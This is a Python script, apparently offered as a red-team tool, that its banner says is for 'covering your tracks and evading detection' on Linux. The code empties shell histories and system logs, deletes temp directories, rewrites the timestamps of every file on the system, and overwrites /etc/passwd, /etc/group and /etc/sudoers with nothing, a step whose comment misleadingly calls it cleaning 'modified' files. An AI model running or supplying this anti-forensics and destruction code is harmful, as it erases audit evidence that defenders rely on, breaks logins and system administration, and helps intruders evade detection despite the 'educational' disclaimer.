import os
import subprocess
import time
import shutil

print(r"""
       
       _ _        ____                       
      | (_) __ _ / _  |_   _ __ _ _ __  ___  
      | | |/ _` | (_| | | | |__` | '_ \/ _ \ 
   ___| | | | | |\__  | |_| |  | | |_) \__  |
  |_____|_|_| |_|   |_|_.__/   |_| .__/|___/ 
                                  \___|           Written by: 0x0bfixious

       """)

print(" This python script is made for Penetration Testers & Red Teamers.")
print(" Useful for covering your tracks and evading detection.")
print(" The tool is for Educational Purposes Only. Do not condone in illegal activities.")
print(" I am not responsible for any illegal/harmful activities done by those who use it.")
print("""
      
      """)


# list of files and directories to clean
history_files = [
    "~/.bash_history", "~/.zsh_history", "~/.history",
    "/root/.bash_history", "/root/.zsh_history", "/root/.history"
]

log_files = [
    "/var/log/auth.log", "/var/log/syslog", "/var/log/secure", "/var/log/messages",
    "/var/log/boot.log", "/var/log/faillog", "/var/log/cron", "/var/log/dmesg"
]

temp_dirs = ["/tmp", "/var/tmp", "~/.cache"]

# remove or overwrite history files
def clear_history():
    for history_file in history_files:
        history_file = os.path.expanduser(history_file)
        if os.path.exists(history_file):
            print(f"Clearing history file: {history_file}")
            open(history_file, 'w').close()  # overwrite history file with empty content

# clear common system logs
def clear_logs():
    for log_file in log_files:
        if os.path.exists(log_file):
            print(f"Clearing log file: {log_file}")
            with open(log_file, 'w') as f:
                f.write("")  # overwrite log file with empty content

# remove temporary files
def clear_temp_files():
    for temp_dir in temp_dirs:
        temp_dir = os.path.expanduser(temp_dir)
        if os.path.exists(temp_dir):
            print(f"Cleaning temp directory: {temp_dir}")
            try:
                shutil.rmtree(temp_dir)
                os.makedirs(temp_dir)  # recreate the temp directory after cleaning
            except Exception as e:
                print(f"Error cleaning {temp_dir}: {e}")

# reset file timestamps
def reset_file_timestamps():
    directories_to_check = ["/home", "/root", "/etc", "/tmp", "/var"]
    for root, dirs, files in os.walk("/"):
        for name in dirs + files:
            path = os.path.join(root, name)
            if os.path.exists(path):
                print(f"Resetting timestamp for: {path}")
                current_time = int(time.time())
                os.utime(path, (current_time, current_time))  # reset to current time

# remove modified user/group files
def clean_user_group_modifications():
    # check for modifications to /etc/passwd, /etc/group, and /etc/sudoers
    user_group_files = ["/etc/passwd", "/etc/group", "/etc/sudoers"]
    for file in user_group_files:
        if os.path.exists(file):
            print(f"Resetting file: {file}")
            try:
                subprocess.run(["chattr", "-i", file], check=True)  # remove immutable flag (if set)
                open(file, 'w').close()  # overwrite file with empty content
            except Exception as e:
                print(f"Error clearing {file}: {e}")

# the cleaning process
def main():
    print("[*] Starting cleanup...")

    # clear shell history
    clear_history()

    # clear log files
    clear_logs()

    # clean temporary files
    clear_temp_files()

    # reset file timestamps
    reset_file_timestamps()

    # clean user/group modifications (if any)
    clean_user_group_modifications()

    print("[*] Linux trace cleanup complete.")

if __name__ == '__main__':
    main()
